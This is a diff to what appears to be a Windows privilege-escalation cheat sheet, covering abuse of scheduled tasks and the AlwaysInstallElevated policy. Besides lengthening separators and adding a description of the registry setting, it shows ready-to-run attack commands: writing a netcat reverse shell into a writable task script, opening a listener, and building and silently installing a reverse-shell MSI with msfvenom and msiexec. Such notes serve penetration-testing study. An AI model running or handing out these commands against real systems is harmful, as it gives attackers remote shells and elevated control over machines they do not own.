@@ -187,23 +187,28 @@ reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 schtasks # List recipe all scheduled tasks
 schtasks /query /fo LIST /v # list of all the scheduled tasks in the system, along with the full details of each task
 schtasks /query /tn vulntask /fo list /v  # Receive complete information about a particular task (eg Vulntask)
-------------------------------
+----------------------------------------------------------------
 icacls c:\tasks\schtask.bat # check the file permissions in target system 
-------------------------------
+----------------------------------------------------------------
 echo c:\tools\nc64.exe -e cmd.exe 10.10.10.10 4444 > C:\tasks\schtask.bat # Add a Reverse Shell in the executable file
-------------------------------
+----------------------------------------------------------------
 nc -lvnp 4444 # Launch Lenner on the Hacker System
-------------------------------
-schtasks /run /tn vulntask # target system
+----------------------------------------------------------------
+schtasks /run /tn vulntask # run 
 ```
 ## AlwaysInstallElevated ✅
+### Description
+"AlwaysInstallElevated" is a Windows Registry setting that affects the behavior of the Windows Installer service. The vulnerability arises when the "AlwaysInstallElevated" registry key is configured with a value of "1" in the Windows Registry.
+
+When this registry key is enabled, it allows non-administrator users to install software packages with elevated privileges. In other words, users who shouldn't have administrative rights can exploit this vulnerability to execute arbitrary code with elevated permissions, potentially compromising the security of the system.
+--------------------------------------------------------------------------------------------------------------------------------
 ```cmd
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer # target system
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer # target system
-------------------------------
+--------------------------------------------------------------------------------------------------------------------------------
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o malicious.msi # our kali
 # transfer malicious.msi file to our kali # target system
-------------------------------
+--------------------------------------------------------------------------------------------------------------------------------
 msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi # target system
 ```
 
